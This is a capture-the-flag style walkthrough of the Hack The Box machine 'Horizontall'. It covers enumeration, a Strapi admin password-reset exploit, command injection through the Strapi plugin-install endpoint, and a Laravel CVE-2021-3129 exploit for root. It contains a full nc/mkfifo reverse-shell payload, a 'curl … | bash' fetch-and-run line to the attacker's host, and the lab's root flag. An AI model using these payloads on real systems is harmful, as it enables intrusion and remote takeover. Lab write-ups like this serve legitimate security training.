---
title: Horizontall - Hack The Box
date: 2021-08-29 07:07:07 +07:07
tags: [HTB]
description: Easy rated machine from Hack The Box
images: "/assets/img/horizontall/horizontall.png"
---

<figure>
<img src="/assets/img/horizontall/horizontall.png" alt="icon">
<figcaption> Horizontall - Hack The Box </figcaption>
</figure>

# Introduction

<a href="https://www.hackthebox.com/home/machines/profile/374" target="_blank" rel="noopener nofollow">Horizontall </a> is a easy rated machine from Hack The Box which includes admin's password reset of <a href="https://thatsn0tmysite.wordpress.com/2019/11/15/x05/" target="_blank" rel="noopener">strapi </a>, which leads to login as admin. There is RCE in starpi which will initially give us a shell as strapi user. There is vulnerable <a href="https://github.com/nth347/CVE-2021-3129_exploit" target="_blank" rel="noopener nofollow">Laravel</a> running on port 8000. So, we forward it and exploit locally to get a reverse shell.


# Nmap

```bash
# Nmap 7.91 scan initiated Thu Feb  3 09:14:00 2022 as: nmap -sC -sV -vv -oA nmap/ports 10.10.11.105
Nmap scan report for 10.10.11.105
Host is up, received timestamp-reply ttl 63 (0.48s latency).
Scanned at 2022-02-03 09:14:01 EST for 22s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 09:14:23 2022 -- 1 IP address (1 host up) scanned in 23.30 seconds
```

Hostname is leaked by nmap. Adding it to hosts file.

# Sub Domain

After not finding anything special on webpage, fuzzing for subdomains, we get a hit on api-prod.horizontall.htb.

```bash
% gobuster vhost -u http://horizontall.htb -w /opt/Seclists/Discovery/DNS/subdomains-top1million-110000.txt --threads 500
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      500
[+] Wordlist:     /opt/Seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/02/03 09:22:13 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
Progress: 50757 / 114442 (44.35%)                       ^C
[!] Keyboard interrupt detected, terminating.
```
**Note: I have used 500 threads but never use it unless you're in hurry. It breaks your requests and you'll need to start again.**

<figure>
<img src="/assets/img/horizontall/api.png" alt="api">
<figcaption> api-prod.horizontall.htb </figcaption>
</figure>

Fuzzing for sub directories here, we get admin which leads to strapi login.

```bash
gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/03 09:30:37 Starting gobuster in directory enumeration mode
===============================================================
/Admin                (Status: 200) [Size: 854]
/admin                (Status: 200) [Size: 854]
/ADMIN                (Status: 200) [Size: 854]
```

<figure>
<img src="/assets/img/horizontall/strapi.png" alt="strapi">
<figcaption> Strapi Login </figcaption>
</figure>

# Strapi Password Reset

There is <a href="https://thatsn0tmysite.wordpress.com/2019/11/15/x05/" target="_blank" rel="noopener">password</a> reset vulnerability, so we abuse it.

```bash
% python3 passreset.py admin@horizontall.htb http://api-prod.horizontall.htb password123
[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
[*] Sending password reset request...
[*] Setting new password...
[*] Response:
b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODk4ODY1LCJleHAiOjE2NDY0OTA4NjV9.VwtIynidACLnZLk248mwnsoMKXqXHwtZtLuPcnQRH3M","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'
```

**Keep that JWT token with you. We'll be needing that after sometime.**

And now, we can login as admin here.

<figure>
<img src="/assets/img/horizontall/admin.png" alt="admin">
<figcaption> Strapi Admin </figcaption>
</figure>

There is vulnerable strapi running which already has some public <a href="https://bittherapy.net/post/strapi-framework-remote-code-execution/" target="_blank" rel="noopener">exploits</a>, so we use it to get a shell.

# Reverse shell

```bash
curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODk4ODY1LCJleHAiOjE2NDY0OTA4NjV9.VwtIynidACLnZLk248mwnsoMKXqXHwtZtLuPcnQRH3M' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.57 1337 >/tmp/f)\",\"port\":\"1337\"}' $'http://api-prod.horizontall.htb/admin/plugins/install' --proxy http://127.0.0.1:8080
```
I am sending it through burp if I have typo somewhere.

<figure>
<img src="/assets/img/horizontall/burp.png" alt="burp">
<figcaption> Shell </figcaption>
</figure>

And indeed I had typos, so just reset according to your need.

```bash
% nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.57] from (UNKNOWN) [10.10.11.105] 40152
/bin/sh: 0: can't access tty; job control turned off
$ 
```

# Root

Strapi's home directory is in opt. So, after creating a .ssh directory and adding ssh key we can login with ssh. There is laravel running on port 8000, which we forward to exploit locally.

<figure>
<img src="/assets/img/horizontall/laravel.png" alt="Laravel">
<figcaption> Laravel </figcaption>
</figure>

Vulnerable <a href="https://github.com/nth347/CVE-2021-3129_exploit" target="_blank" rel="noopener nofollow">Laravel</a> is running, so we exploit it.

```bash
% python3 exploit.py http://localhost:8000 Monolog/RCE1 "id"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
% python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

ee85c5acec1939622724057929ff61ca

[i] Trying to clear logs
[+] Logs cleared
```

# Shell as root

```bash
python3 exploit.py http://localhost:8000 Monolog/RCE1 "curl 10.10.14.57/zex.sh|bash"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR

% nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.57] from (UNKNOWN) [10.10.11.105] 49770
bash: cannot set terminal process group (9589): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# cat /root/root.txt
cat /root/root.txt
ee85c5acec1939622724057929ff61ca
root@horizontall:/home/developer/myproject/public#
```